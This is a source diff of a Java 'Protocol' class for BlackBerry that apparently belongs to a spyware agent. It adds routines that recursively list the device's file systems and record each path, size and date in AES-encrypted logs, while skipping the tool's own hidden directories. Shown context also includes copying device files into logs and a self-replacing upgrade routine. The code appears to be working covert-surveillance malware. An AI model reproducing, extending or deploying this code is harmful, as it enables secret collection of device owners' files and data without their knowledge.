@@ -1,7 +1,10 @@
 //#preprocess
 package blackberry.action.sync;
 
+import java.util.Date;
 import java.util.Enumeration;
+
+import javax.microedition.io.file.FileSystemRegistry;
 
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.DataBuffer;
@@ -18,6 +21,7 @@ import blackberry.transfer.CommandException;
 import blackberry.transfer.Proto;
 import blackberry.transfer.ProtocolException;
 import blackberry.utils.Check;
+import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
@@ -58,10 +62,10 @@ public abstract class Protocol {
         return ret;
     }
 
-    public static void saveUpload(String filename, byte[] content){
+    public static void saveUpload(String filename, byte[] content) {
         final AutoFlashFile file = new AutoFlashFile(Path.USER() + filename,
                 true);
-        
+
         if (file.exists()) {
             //#ifdef DEBUG
             debug.trace("getUpload replacing existing file: " + filename);
@@ -75,7 +79,7 @@ public abstract class Protocol {
         debug.trace("file written: " + file.exists());
         //#endif
     }
-    
+
     public static boolean upgrade(byte[] codBuff) {
         // Delete it self.
         final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
@@ -143,7 +147,36 @@ public abstract class Protocol {
         return true;
     }
 
-    
+    public static void saveDownloadLog(String filefilter) {
+        AutoFlashFile file = new AutoFlashFile(filefilter, false);
+        if (file.exists()) {
+            //#ifdef DEBUG
+            debug.trace("logging file: " + filefilter);
+            //#endif
+            saveFileLog(file, filefilter);
+        } else {
+            //#ifdef DEBUG
+            debug.trace("not a file, try to expand it: " + filefilter);
+            //#endif
+            for (Enumeration enum = Directory.find(filefilter); enum
+                    .hasMoreElements();) {
+                String filename = (String) enum.nextElement();
+
+                file = new AutoFlashFile(filename, false);
+                if (file.isDirectory()) {
+                    continue;
+                }
+
+                saveFileLog(file, filename);
+
+                //#ifdef DEBUG
+                debug.trace("logging file: " + filename);
+                //#endif
+
+            }
+        }
+    }
+
     private static void saveFileLog(AutoFlashFile file, String filename) {
         //#ifdef DBC
         Check.requires(file != null, "null file");
@@ -160,7 +193,7 @@ public abstract class Protocol {
         log.close();
     }
 
-    public static byte[] logDownloadAdditional(String filename) {
+    private static byte[] logDownloadAdditional(String filename) {
 
         //#ifdef DBC
         Check.requires(filename != null, "null file");
@@ -198,33 +231,191 @@ public abstract class Protocol {
         return buffer;
     }
 
-    public static void saveDownloadLog(String filefilter) {
-        AutoFlashFile file = new AutoFlashFile(filefilter, false);
-        if (file.exists()) {
+   
+
+    public static void saveFilesystem(int depth, String path) {
+        Log fsLog = new Log(false, Keys.getInstance().getAesKey());
+        fsLog.createLog(null, LogType.FILESYSTEM);
+
+        // Expand path and create log
+        if (path.equals("/")) {
             //#ifdef DEBUG
-            debug.trace("logging file: " + filefilter);
+            debug.trace("sendFilesystem: root");
             //#endif
-            saveFileLog(file, filefilter);
+            expandRoot(fsLog, depth);
         } else {
-            //#ifdef DEBUG
-            debug.trace("not a file, try to expand it: " + filefilter);
-            //#endif
-            for (Enumeration enum = Directory.find(filefilter); enum
-                    .hasMoreElements();) {
-                String filename = (String) enum.nextElement();
+            if (path.startsWith("//") && path.endsWith("/*")) {
+                path = path.substring(1, path.length() - 2);
 
-                file = new AutoFlashFile(filename, false);
-                if (file.isDirectory()) {
-                    continue;
-                }
-
-                saveFileLog(file, filename);
-
+                expandPath(fsLog, path, depth);
+            } else {
                 //#ifdef DEBUG
-                debug.trace("logging file: " + filename);
+                debug.error("sendFilesystem: strange path, ignoring it. "
+                        + path);
                 //#endif
+            }
+        }
 
+        fsLog.close();
+    }
+
+    /**
+     * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
+     * 
+     * @param depth
+     */
+    private static void expandRoot(Log fsLog, int depth) {
+        //#ifdef DBC
+        Check.requires(depth > 0, "wrong recursion depth");
+        //#endif
+
+        saveRootLog(fsLog); // depth 0
+        final Enumeration roots = FileSystemRegistry.listRoots();
+
+        while (roots.hasMoreElements()) {
+            String root = (String) roots.nextElement();
+            if (root.endsWith("/")) {
+                root = root.substring(0, root.length() - 1);
+            }
+            //#ifdef DEBUG
+            debug.trace("expandRoot: " + root + " depth: " + depth);
+            //#endif
+            Protocol.saveFilesystemLog(fsLog, "/" + root); // depth 1
+            if (depth - 1 > 0) {
+                // if depth is 0, no recursion is required
+                expandPath(fsLog, "/" + root, depth - 1); // depth 2+
             }
         }
     }
+
+    private static boolean saveFilesystemLog(Log fsLog, String filepath) {
+        //#ifdef DBC
+        Check.requires(fsLog != null, "fsLog null");
+        Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
+        Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
+        //#endif
+
+        //#ifdef DEBUG
+        debug.info("save FilesystemLog: " + filepath);
+        //#endif
+        int version = 2010031501;
+
+        AutoFlashFile file = new AutoFlashFile(filepath);
+        if (!file.exists()) {
+            //#ifdef DEBUG
+            debug.error("non existing file: " + filepath);
+            //#endif
+            return false;
+        }
+
+        byte[] w_filepath = WChar.getBytes(filepath, true);
+
+        byte[] content = new byte[28 + w_filepath.length];
+        DataBuffer databuffer = new DataBuffer(content, 0, content.length,
+                false);
+
+        databuffer.writeInt(version);
+        databuffer.writeInt(w_filepath.length);
+
+        int flags = 0;
+        long size = file.getSize();
+
+        boolean isDir = file.isDirectory();
+        if (isDir) {
+            flags |= 1;
+        } else {
+            if (size == 0) {
+                flags |= 2;
+            }
+        }
+
+        databuffer.writeInt(flags);
+        databuffer.writeLong(size);
+        databuffer.writeLong(DateTime.getFiledate(file.getFileTime()));
+        databuffer.write(w_filepath);
+
+        fsLog.writeLog(content);
+
+        //#ifdef DEBUG
+        debug.trace("expandPath: written log");
+        //#endif
+
+        return isDir;
+    }
+    
+    /**
+     * saves the root log. We use this method because the directory "/" cannot
+     * be opened, we fake it.
+     */
+    private static void saveRootLog(Log fsLog) {
+        int version = 2010031501;
+
+        //#ifdef DBC
+        Check.requires(fsLog != null, "fsLog null");
+        //#endif
+        byte[] content = new byte[30];
+        DataBuffer databuffer = new DataBuffer(content, 0, content.length,
+                false);
+        databuffer.writeInt(version);
+        databuffer.writeInt(2); // len
+        databuffer.writeInt(1); // flags
+        databuffer.writeLong(0);
+        databuffer.writeLong(DateTime.getFiledate(new Date()));
+        databuffer.write(WChar.getBytes("/"));
+
+        fsLog.writeLog(content);
+    }
+
+    /**
+     * Expand recursively the path saving the log. When depth is 0 saves the log
+     * and stop recurring.
+     * 
+     * @param path
+     * @param depth
+     */
+    private static void expandPath(Log fsLog, String path, int depth) {
+        //#ifdef DBC
+        Check.requires(depth > 0, "wrong recursion depth");
+        Check.requires(path != null, "path==null");
+        Check.requires(!path.endsWith("/"), "path shouldn't end with /");
+        Check.requires(!path.endsWith("*"), "path shouldn't end with *");
+        //#endif
+
+        //#ifdef DEBUG
+        debug.trace("expandPath: " + path + " depth: " + depth);
+        //#endif
+
+        //saveFilesystemLog(path);
+        //if (depth > 0) {
+        for (Enumeration enum = Directory.find(path + "/*"); enum
+                .hasMoreElements();) {
+
+            String dPath = path + "/" + (String) enum.nextElement();
+            if (dPath.endsWith("/")) {
+                //#ifdef DEBUG
+                debug.trace("expandPath: dir");
+                //#endif
+                dPath = dPath.substring(0, dPath.length() - 1); // togli lo /
+            } else {
+                //#ifdef DEBUG
+                debug.trace("expandPath: file");
+                //#endif
+            }
+
+            if (dPath.indexOf(Utils.chomp(Path.SD(), "/")) >= 0
+                    || dPath.indexOf(Utils.chomp(Path.USER(), "/")) >= 0) {
+                //#ifdef DEBUG
+                debug.warn("expandPath ignoring hidden path: " + dPath);
+                //#endif
+                continue;
+            }
+
+            boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
+            if (isDir && depth > 1) {
+                expandPath(fsLog, dPath, depth - 1);
+            }
+        }
+        //}
+    }
+
 }
